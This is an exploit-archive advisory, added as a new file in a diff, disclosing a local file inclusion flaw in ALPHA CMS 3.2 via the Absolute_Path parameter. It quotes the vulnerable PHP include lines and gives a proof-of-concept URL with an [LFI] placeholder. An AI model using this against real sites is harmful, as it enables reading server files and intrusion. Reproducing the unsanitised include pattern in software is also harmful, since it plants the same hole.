@@ -1,0 +1,74 @@
+########################################################
+ 
+    fucking the Web Apps [attack edition]
+ 
+ ____                  __                              __    __               
+/\  _`\               /\ \      __                    /\ \__/\ \              
+\ \ \L\_\__  __    ___\ \ \/'\ /\_\    ___      __    \ \ ,_\ \ \___      __  
+ \ \  _\/\ \/\ \  /'___\ \ , < \/\ \ /' _ `\  /'_ `\   \ \ \/\ \  _ `\  /'__`\
+  \ \ \/\ \ \_\ \/\ \__/\ \ \\`\\ \ \/\ \/\ \/\ \L\ \   \ \ \_\ \ \ \ \/\  __/
+   \ \_\ \ \____/\ \____\\ \_\ \_\ \_\ \_\ \_\ \____ \   \ \__\\ \_\ \_\ \____\
+    \/_/  \/___/  \/____/ \/_/\/_/\/_/\/_/\/_/\/___L\ \   \/__/ \/_/\/_/\/____/
+                                                /\____/                       
+                                                \_/__/                        
+ __      __          __          ______                       Hack0wn! Security Project    
+/\ \  __/\ \        /\ \        /\  _  \                          
+\ \ \/\ \ \ \     __\ \ \____   \ \ \L\ \  _____   _____     ____ 
+ \ \ \ \ \ \ \  /'__`\ \ '__`\   \ \  __ \/\ '__`\/\ '__`\  /',__\
+  \ \ \_/ \_\ \/\  __/\ \ \L\ \   \ \ \/\ \ \ \L\ \ \ \L\ \/\__, `\
+   \ `\___x___/\ \____\\ \_,__/    \ \_\ \_\ \ ,__/\ \ ,__/\/\____/
+    '\/__//__/  \/____/ \/___/      \/_/\/_/\ \ \/  \ \ \/  \/___/
+                                             \ \_\   \ \_\        
+                                              \/_/    \/_/         
+
+
+[+]Title	:	ALPHA CMS Local File Inclusion Vulnerability
+[+]Version:	3.2
+[+]Download:	http://sourceforge.net/projects/alpha-cms/files/
+[+]Author:	eidelweiss
+[+]Metode:	Local File Inclusion	
+[+]CWE:		22
+
+	[*]Special to Syabilla_putri (I miss u so much to)[*]
+
+ [!]Thank`s Fly To:
+
+[~] Jose Luis Gongora Fernandez a.k.a JosS - sp3x (securityreason)
+[~] exploit-db team
+[~] Inj3ct0r.com r0073r & 0x1D [Inj3ct0r Exploit Database] - [D]eal [C]yber
+
+
+########################################################
+
+Description:
+
+ALPHA CMS is an A.P.I - free (Open Archiecture), MVC based Content Management System. 
+ALPHA CMS architecture gives the ability to easily create advanced web pages, add-ons or even other CMS. 
+ALPHA CMS is based on PHP, Smarty, JavaScript and MySQL.
+
+	-=[ Vuln C0de ]=-
+
+[!] File name: alpha.php
+
+    // Create a new ALPHA CMS object
+    $alpha = new ALPHA;
+    
+    // Include DTBS class
+    require_once($alpha->Absolute_Path() . 'db.php');
+    
+    // Include CTRL class
+    require_once($alpha->Absolute_Path() . 'controler.php');
+    
+    // Include UTL class
+    require_once($alpha->Absolute_Path() . 'utilities.php');
+    
+    // Include STY class
+    require_once($alpha->Absolute_Path() . 'smarty.php');
+
+
+	-=[ Proof Of Concept ]=-
+
+	http://127.0.0.1/alpha.php?Absolute_Path=[LFI]
+
+######################=[E0F]=#############################
+
